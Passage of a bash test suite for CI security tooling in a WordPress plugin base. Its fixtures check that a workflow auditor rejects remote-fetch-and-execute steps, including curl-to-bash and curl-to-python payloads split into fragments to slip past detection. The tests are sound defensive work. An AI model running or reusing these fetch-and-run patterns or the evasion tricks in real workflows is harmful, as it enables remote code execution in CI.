  echo "Audit unexpectedly passed for a composite action that dispatches to a local helper script." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
mkdir -p "$audit_fixture/.github/actions/test-action"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: ./.github/actions/test-action
EOF

cat > "$audit_fixture/.github/actions/test-action/action.yml" <<'EOF'
name: test-action
runs:
  using: composite
  steps:
    - shell: bash
      run: source ./helper.sh
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a composite action that sources a local helper script." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  lint:
    permissions:
      contents: read
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if ! bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly failed for a valid custom workflow." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: |
          curl -fsSL https://github.com/example/install.sh -o /tmp/install.sh
          bash /tmp/install.sh
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a multiline download-then-execute payload." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows" "$audit_fixture/scripts"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: bash scripts/test.sh
EOF

script_download_scheme='https'
script_download_separator='://'
script_download_target='github.com/example/install.sh'
cat > "$audit_fixture/scripts/test.sh" <<EOF
cur''l -fsSL ${script_download_scheme}${script_download_separator}${script_download_target} -o /tmp/install.sh
bash /tmp/install.sh
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a multiline download-then-execute shell script." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/ci.yml" <<'EOF'
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

dynamic_scheme='https'
dynamic_separator='://'
dynamic_host='example.com'
dynamic_path='payload.py'
dynamic_interpreter='py''thon'
printf '      - run: |\n' >> "$audit_fixture/.github/workflows/ci.yml"
printf '          scheme=%s\n' "$dynamic_scheme" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          host=%s\n' "$dynamic_host" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          path_part=%s\n' "$dynamic_path" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          url="${scheme}%s${host}/${path_part}"\n' "$dynamic_separator" >> "$audit_fixture/.github/workflows/ci.yml"
printf '          cur''l -fsSL "$url" | %s\n' "$dynamic_interpreter" >> "$audit_fixture/.github/workflows/ci.yml"

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a dynamic remote script payload piped to python." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"

cat > "$audit_fixture/.github/workflows/custom.yaml" <<'EOF'
name: custom
on: workflow_dispatch
permissions:
  contents: read
jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a .yaml workflow file." >&2
  exit 1
fi

rm -rf "$audit_fixture"
audit_fixture="$(mktemp -d)"
mkdir -p "$audit_fixture/.github/workflows"
extra_url_scheme='https'
extra_url_separator='://'
extra_url_host='raw.githubusercontent.com'
extra_url_path='example/repo/main/file.txt'
extra_url="${extra_url_scheme}${extra_url_separator}${extra_url_host}/${extra_url_path}"

cat > "$audit_fixture/.github/workflows/ci.yml" <<EOF
name: ci
on: workflow_dispatch
permissions:
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@de0fac2e4500dabe0009e67214ff5f5447ce83dd
      - run: echo "$extra_url"
EOF

if bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly passed for a non-allowlisted host." >&2
  exit 1
fi

if ! EXTRA_ALLOWED_HOSTS='raw.githubusercontent.com' bash "$ROOT_DIR/scripts/ci/audit_workflows.sh" "$audit_fixture"; then
  echo "Audit unexpectedly failed when EXTRA_ALLOWED_HOSTS included the host." >&2
  exit 1
fi

authorization_fixture="$(mktemp -d)"
mkdir -p "$authorization_fixture/includes"
cat > "$authorization_fixture/.wp-plugin-base.env" <<'EOF'
WORDPRESS_SECURITY_PACK_ENABLED=true
EOF

cat > "$authorization_fixture/includes/public-endpoints.php" <<'EOF'
<?php
add_action( 'wp_ajax_nopriv_my_public_action', 'my_public_handler' );
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly passed without a suppression." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_public",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": "Intentional public endpoint."
    }
  ]
}
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly accepted an invalid suppression kind." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": ""
    }
  ]
}
EOF

if WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly passed with an empty suppression justification." >&2
  exit 1
fi

cat > "$authorization_fixture/.wp-plugin-base-security-suppressions.json" <<'EOF'
{
  "suppressions": [
    {
      "kind": "wp_ajax_nopriv",
      "identifier": "my_public_action",
      "path": "includes/public-endpoints.php",
      "justification": "Public endpoint is required for unauthenticated preflight and only returns nonce-gated non-sensitive metadata."
    }
  ]
}
EOF

if ! WP_PLUGIN_BASE_ROOT="$authorization_fixture" bash "$ROOT_DIR/scripts/ci/scan_wordpress_authorization_patterns.sh" >/dev/null 2>&1; then
  echo "Authorization scan unexpectedly failed with a justified suppression." >&2
  exit 1
fi

deploy_protection_fixture="$(mktemp -d)"
cat > "$deploy_protection_fixture/.wp-plugin-base.env" <<'EOF'
PRODUCTION_ENVIRONMENT=production
EOF

if ! WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_protection_fixture" bash "$ROOT_DIR/scripts/ci/check_deploy_environment_protection.sh" >/dev/null 2>&1; then
  echo "Deploy environment protection check unexpectedly failed in non-strict mode." >&2
  exit 1
fi

if WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_protection_fixture" bash "$ROOT_DIR/scripts/ci/check_deploy_environment_protection.sh" --strict >/dev/null 2>&1; then
  echo "Deploy environment protection check unexpectedly passed in strict mode without GitHub environment context." >&2
  exit 1
fi

deploy_local_project_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$deploy_local_project_fixture/"
mkdir -p "$deploy_local_project_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$deploy_local_project_fixture/.wp-plugin-base/"
WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" bash "$ROOT_DIR/scripts/update/sync_child_repo.sh"
if ! env -u GITHUB_ACTIONS -u GITHUB_REPOSITORY -u GH_TOKEN -u GITHUB_TOKEN \
  WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" \
  bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "release/1.2.3" >/dev/null 2>&1; then
  echo "Project validation unexpectedly failed locally for a deploy-enabled project." >&2
  exit 1
fi

if GITHUB_ACTIONS=true GITHUB_REPOSITORY=example/repo WP_ORG_DEPLOY_ENABLED=true WP_PLUGIN_BASE_ROOT="$deploy_local_project_fixture" bash "$ROOT_DIR/scripts/ci/validate_project.sh" "" "release/1.2.3" >/dev/null 2>&1; then
  echo "Project validation unexpectedly passed in strict GitHub mode without deploy environment access." >&2
  exit 1
fi

zip_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$zip_fixture/"
mkdir -p "$zip_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$zip_fixture/.wp-plugin-base/"
cat >> "$zip_fixture/.wp-plugin-base.env" <<'EOF'
SVN_USERNAME=fixture-bot
EOF

if WP_PLUGIN_BASE_ROOT="$zip_fixture" bash "$ROOT_DIR/scripts/ci/validate_config.sh" >/dev/null 2>&1; then
  echo "Config validation unexpectedly accepted committed WordPress.org credentials." >&2
  exit 1
fi

perl -0pi -e 's/^SVN_USERNAME=.*\n//m' "$zip_fixture/.wp-plugin-base.env"
perl -0pi -e 's/^ZIP_FILE=.*/ZIP_FILE=..\/outside.zip/m' "$zip_fixture/.wp-plugin-base.env"

if WP_PLUGIN_BASE_ROOT="$zip_fixture" bash "$ROOT_DIR/scripts/ci/validate_config.sh" >/dev/null 2>&1; then
  echo "Config validation unexpectedly accepted an escaping ZIP_FILE." >&2
  exit 1
fi

rm -rf "$zip_fixture"

release_branch_source_fixture="$(mktemp -d)"
mkdir -p "$release_branch_source_fixture/bin"
cat > "$release_branch_source_fixture/bin/git" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "ls-remote" ] && [ "$2" = "--exit-code" ] && [ "$3" = "--heads" ] && [ "$4" = "origin" ]; then
  if [ "${RELEASE_BRANCH_EXISTS:-false}" = "true" ]; then
    exit 0
  fi
  exit 2
fi
echo "Unexpected git invocation: $*" >&2
exit 1
EOF
cat > "$release_branch_source_fixture/bin/gh" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "pr" ] && [ "$2" = "list" ]; then
  printf '%s\n' "${RELEASE_BRANCH_OPEN_PR_COUNT:-0}"
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$release_branch_source_fixture/bin/git" "$release_branch_source_fixture/bin/gh"
release_branch_source_output="$(mktemp)"
PATH="$release_branch_source_fixture/bin:$PATH" \
  GH_TOKEN=fixture-token \
  RELEASE_BRANCH_EXISTS=true \
  RELEASE_BRANCH_OPEN_PR_COUNT=1 \
  bash "$ROOT_DIR/scripts/update/resolve_release_branch_source.sh" \
    "example/repo" \
    "example" \
    "release/1.2.3" \
    "main" \
    "$release_branch_source_output"
grep -Fxq 'branch_exists=true' "$release_branch_source_output"
grep -Fxq 'ref=release/1.2.3' "$release_branch_source_output"
grep -Fxq 'open_pr_exists=true' "$release_branch_source_output"
: > "$release_branch_source_output"
PATH="$release_branch_source_fixture/bin:$PATH" \
  GH_TOKEN=fixture-token \
  RELEASE_BRANCH_EXISTS=false \
  bash "$ROOT_DIR/scripts/update/resolve_release_branch_source.sh" \
    "example/repo" \
    "example" \
    "release/1.2.3" \
    "main" \
    "$release_branch_source_output"
grep -Fxq 'branch_exists=false' "$release_branch_source_output"
grep -Fxq 'ref=main' "$release_branch_source_output"
grep -Fxq 'open_pr_exists=false' "$release_branch_source_output"

pr_stage_fixture="$(mktemp -d)"
pr_stage_origin="$(mktemp -d)"
git init --bare -q "$pr_stage_origin"
git -C "$pr_stage_fixture" init -q
git -C "$pr_stage_fixture" config user.email "fixture@example.com"
git -C "$pr_stage_fixture" config user.name "Fixture"
mkdir -p "$pr_stage_fixture/.security"
mkdir -p "$pr_stage_fixture/.wp-plugin-base-security-pack"
cat > "$pr_stage_fixture/.wp-plugin-base-security-pack/composer.json" <<'EOF'
{"name":"fixture/security-pack"}
EOF
cat > "$pr_stage_fixture/.phpcs-security.xml.dist" <<'EOF'
<ruleset name="fixture-security"/>
EOF
cat > "$pr_stage_fixture/.phpcs.xml.dist" <<'EOF'
<ruleset name="fixture-quality"/>
EOF
cat > "$pr_stage_fixture/.security/custom-security-suppressions.json" <<'EOF'
{"suppressions":[]}
EOF
git -C "$pr_stage_fixture" add \
  .wp-plugin-base-security-pack/composer.json \
  .phpcs-security.xml.dist \
  .phpcs.xml.dist \
  .security/custom-security-suppressions.json
git -C "$pr_stage_fixture" commit -qm "init"
git -C "$pr_stage_fixture" branch -M main
git -C "$pr_stage_fixture" remote add origin "$pr_stage_origin"
git -C "$pr_stage_fixture" push -q -u origin main
rm -rf "$pr_stage_fixture/.wp-plugin-base-security-pack"
rm -f "$pr_stage_fixture/.phpcs-security.xml.dist" "$pr_stage_fixture/.phpcs.xml.dist"
rm -f "$pr_stage_fixture/.security/custom-security-suppressions.json"
pr_stage_helper_dir="$(mktemp -d)"
cat > "$pr_stage_helper_dir/body.md" <<'EOF'
fixture body
EOF
mkdir -p "$pr_stage_helper_dir/bin"
cat > "$pr_stage_helper_dir/bin/gh" <<'EOF'
#!/usr/bin/env bash
log_file="${PR_STAGE_GH_LOG:?}"
printf '%s\n' "$*" >> "$log_file"
if [ "$1" = "pr" ] && [ "$2" = "list" ]; then
  if [ "${PR_STAGE_EXISTING_PR:-false}" = "true" ]; then
    echo '[{"number":1,"url":"https://github.com/example/repo/pull/1"}]'
    exit 0
  fi
  echo '[]'
  exit 0
fi
if [ "$1" = "pr" ] && [ "$2" = "edit" ]; then
  exit 0
fi
if [ "$1" = "pr" ] && [ "$2" = "create" ]; then
  echo 'https://github.com/example/repo/pull/1'
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$pr_stage_helper_dir/bin/gh"
PR_STAGE_GH_LOG="$pr_stage_helper_dir/gh.log"
export PR_STAGE_GH_LOG
pr_stage_output="$(mktemp)"
(
  cd "$pr_stage_fixture"
  PATH="$pr_stage_helper_dir/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_stage_output" \
    GIT_ADD_PATHS=".wp-plugin-base-security-pack,.phpcs-security.xml.dist,.phpcs.xml.dist,.security/custom-security-suppressions.json" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/fixture-removal" \
      "main" \
      "fixture removal" \
      "fixture removal" \
      "$pr_stage_helper_dir/body.md"
)
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.wp-plugin-base-security-pack/composer.json'; then
  echo "Explicit path staging unexpectedly failed to commit a managed deletion." >&2
  exit 1
fi
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.phpcs-security.xml.dist'; then
  echo "Explicit path staging unexpectedly failed to commit a managed root-file deletion." >&2
  exit 1
fi
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.phpcs.xml.dist'; then
  echo "Explicit path staging unexpectedly failed to commit a managed quality-file deletion." >&2
  exit 1
fi
if git -C "$pr_stage_fixture" ls-tree -r --name-only HEAD | grep -Fq '.security/custom-security-suppressions.json'; then
  echo "Explicit path staging unexpectedly failed to commit a configured suppressions-file deletion." >&2
  exit 1
fi
: > "$PR_STAGE_GH_LOG"
clean_head="$(git -C "$pr_stage_fixture" rev-parse HEAD)"
(
  cd "$pr_stage_fixture"
  : > "$pr_stage_output"
  PATH="$pr_stage_helper_dir/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_stage_output" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/no-changes" \
      "main" \
      "fixture no changes" \
      "fixture no changes" \
      "$pr_stage_helper_dir/body.md"
)
grep -Fxq 'pull_request_operation=none' "$pr_stage_output"
if grep -Fq 'pr create' "$PR_STAGE_GH_LOG"; then
  echo "PR automation unexpectedly attempted to create a PR when there were no staged changes." >&2
  exit 1
fi
if [ "$(git -C "$pr_stage_fixture" rev-parse HEAD)" != "$clean_head" ]; then
  echo "PR automation unexpectedly created a commit when there were no staged changes." >&2
  exit 1
fi
if (
  cd "$pr_stage_fixture"
  PATH="$pr_stage_helper_dir/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    GITHUB_REPOSITORY_OWNER="example" \
    GITHUB_OUTPUT="$pr_stage_output" \
    GIT_ADD_PATHS="missing-path" \
    bash "$ROOT_DIR/scripts/update/create_or_update_pr.sh" \
      "chore/no-matches" \
      "main" \
      "fixture no matches" \
      "fixture no matches" \
      "$pr_stage_helper_dir/body.md"
); then
  echo "PR automation unexpectedly accepted a GIT_ADD_PATHS list with no matching paths." >&2
  exit 1
fi

release_publish_fixture="$(mktemp -d)"
cat > "$release_publish_fixture/notes.md" <<'EOF'
fixture release notes
EOF
cat > "$release_publish_fixture/asset.txt" <<'EOF'
asset
EOF
mkdir -p "$release_publish_fixture/bin"
cat > "$release_publish_fixture/bin/gh" <<'EOF'
#!/usr/bin/env bash
log_file="${RELEASE_PUBLISH_LOG:?}"
printf '%s\n' "$*" >> "$log_file"
if [ "$1" = "release" ] && [ "$2" = "view" ]; then
  if [ "${RELEASE_ALREADY_EXISTS:-false}" = "true" ]; then
    exit 0
  fi
  exit 1
fi
if [ "$1" = "release" ] && { [ "$2" = "edit" ] || [ "$2" = "upload" ] || [ "$2" = "create" ]; }; then
  exit 0
fi
echo "Unexpected gh invocation: $*" >&2
exit 1
EOF
chmod +x "$release_publish_fixture/bin/gh"
release_publish_output="$release_publish_fixture/gh.log"
: > "$release_publish_output"
(
  cd "$release_publish_fixture"
  PATH="$release_publish_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_PUBLISH_LOG="$release_publish_output" \
    RELEASE_ALREADY_EXISTS=false \
    bash "$ROOT_DIR/scripts/release/publish_github_release.sh" \
      "v1.2.3" \
      "Release v1.2.3" \
      "$release_publish_fixture/notes.md" \
      "$release_publish_fixture/asset.txt"
)
grep -Fq 'release create v1.2.3' "$release_publish_output"
grep -Fq -- '--verify-tag' "$release_publish_output"
: > "$release_publish_output"
if (
  cd "$release_publish_fixture"
  PATH="$release_publish_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_PUBLISH_LOG="$release_publish_output" \
    RELEASE_ALREADY_EXISTS=true \
    bash "$ROOT_DIR/scripts/release/publish_github_release.sh" \
      "v1.2.3" \
      "Release v1.2.3" \
      "$release_publish_fixture/notes.md" \
      "$release_publish_fixture/asset.txt"
); then
  echo "Release publication unexpectedly passed without --repair when the release already existed." >&2
  exit 1
fi
: > "$release_publish_output"
(
  cd "$release_publish_fixture"
  PATH="$release_publish_fixture/bin:$PATH" \
    GITHUB_REPOSITORY="example/repo" \
    RELEASE_PUBLISH_LOG="$release_publish_output" \
    RELEASE_ALREADY_EXISTS=true \
    bash "$ROOT_DIR/scripts/release/publish_github_release.sh" \
      --repair \
      "v1.2.3" \
      "Release v1.2.3" \
      "$release_publish_fixture/notes.md" \
      "$release_publish_fixture/asset.txt"
)
grep -Fq 'release edit v1.2.3' "$release_publish_output"
grep -Fq 'release upload v1.2.3' "$release_publish_output"
if grep -Fq 'release create' "$release_publish_output"; then
  echo "Release repair unexpectedly recreated the release instead of editing it." >&2
  exit 1
fi

wordpress_org_deploy_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$wordpress_org_deploy_fixture/"
mkdir -p "$wordpress_org_deploy_fixture/bin"
cat > "$wordpress_org_deploy_fixture/bin/git" <<'EOF'
#!/usr/bin/env bash
if [ "$1" = "-C" ] && [ "$3" = "tag" ] && [ "$4" = "--list" ]; then
  printf '%s\n' "${WPORG_LATEST_REPO_VERSION:-1.2.3}"
  exit 0
fi
echo "Unexpected git invocation: $*" >&2
exit 1
EOF
cat > "$wordpress_org_deploy_fixture/bin/python3" <<'EOF'
#!/usr/bin/env bash
exit 0
EOF
cat > "$wordpress_org_deploy_fixture/bin/svn" <<'EOF'
#!/usr/bin/env bash
case "$1" in
  checkout)
    target="${@: -1}"
    mkdir -p "$target"
    exit 0
    ;;
  update)
    if [ "$SVN_TAG_EXISTS" = "true" ]; then
      target_dir="${@: -1}"
      mkdir -p "$target_dir/tags/${WPORG_VERSION}"
    fi
    target_dir="${@: -1}"
    mkdir -p "$target_dir/trunk" "$target_dir/tags" "$target_dir/assets"
    exit 0
    ;;
  info)
    if [ "$SVN_TAG_EXISTS" = "true" ] && [[ "${@: -1}" = */tags/${WPORG_VERSION} ]]; then
      exit 0
    fi
    exit 1
    ;;
  status)
    exit 0
    ;;
  add|delete|commit)
    exit 0
    ;;
esac
echo "Unexpected svn invocation: $*" >&2
exit 1
EOF
cat > "$wordpress_org_deploy_fixture/bin/rsync" <<'EOF'
#!/usr/bin/env bash
destination="${@: -1}"
if [[ " $* " == *" -ani "* ]] && [ "${WPORG_TAG_DIFFERS:-false}" = "true" ] && [[ "$destination" = */tags/${WPORG_VERSION}/ ]]; then
  printf '%s\n' 'deleting stale-file.php'
fi
exit 0
EOF
chmod +x "$wordpress_org_deploy_fixture/bin/git" "$wordpress_org_deploy_fixture/bin/python3" "$wordpress_org_deploy_fixture/bin/svn" "$wordpress_org_deploy_fixture/bin/rsync"
if (
  cd "$wordpress_org_deploy_fixture"
  PATH="$wordpress_org_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$wordpress_org_deploy_fixture" \
    SVN_USERNAME=fixture-user \
    SVN_PASSWORD=fixture-pass \
    SVN_TAG_EXISTS=true \
    WPORG_TAG_DIFFERS=true \
    WPORG_VERSION=1.2.3 \
    bash "$ROOT_DIR/scripts/release/deploy_wordpress_org.sh" "1.2.3" ".wp-plugin-base.env" "$wordpress_org_deploy_fixture"
); then
  echo "WordPress.org deploy unexpectedly allowed an existing release tag to be mutated." >&2
  exit 1
fi
if (
  cd "$wordpress_org_deploy_fixture"
  PATH="$wordpress_org_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$wordpress_org_deploy_fixture" \
    SVN_USERNAME=fixture-user \
    SVN_PASSWORD=fixture-pass \
    SVN_TAG_EXISTS=true \
    WPORG_TAG_DIFFERS=true \
    WPORG_VERSION=1.2.3 \
    WPORG_LATEST_REPO_VERSION=1.3.0 \
    WP_PLUGIN_BASE_ALLOW_WPORG_TAG_REDEPLOY=true \
    bash "$ROOT_DIR/scripts/release/deploy_wordpress_org.sh" "1.2.3" ".wp-plugin-base.env" "$wordpress_org_deploy_fixture"
); then
  echo "WordPress.org repair deploy unexpectedly allowed an older release tag to overwrite trunk." >&2
  exit 1
fi
(
  cd "$wordpress_org_deploy_fixture"
  PATH="$wordpress_org_deploy_fixture/bin:$PATH" \
    WP_PLUGIN_BASE_ROOT="$wordpress_org_deploy_fixture" \
    SVN_USERNAME=fixture-user \
    SVN_PASSWORD=fixture-pass \
    SVN_TAG_EXISTS=true \
    WPORG_TAG_DIFFERS=true \
    WPORG_VERSION=1.2.3 \
    WPORG_LATEST_REPO_VERSION=1.2.3 \
    WP_PLUGIN_BASE_ALLOW_WPORG_TAG_REDEPLOY=true \
    bash "$ROOT_DIR/scripts/release/deploy_wordpress_org.sh" "1.2.3" ".wp-plugin-base.env" "$wordpress_org_deploy_fixture"
)

forbidden_fixture="$(mktemp -d)"
cp -R "$ROOT_DIR/tests/fixtures/standard-plugin/." "$forbidden_fixture/"
mkdir -p "$forbidden_fixture/.wp-plugin-base"
rsync -a --exclude '.git' "$ROOT_DIR/" "$forbidden_fixture/.wp-plugin-base/"
touch "$forbidden_fixture/.DS_Store"
if WP_PLUGIN_BASE_ROOT="$forbidden_fixture" bash "$ROOT_DIR/scripts/ci/check_forbidden_files.sh" >/dev/null 2>&1; then
  echo "Forbidden file policy unexpectedly accepted .DS_Store." >&2
  exit 1
fi

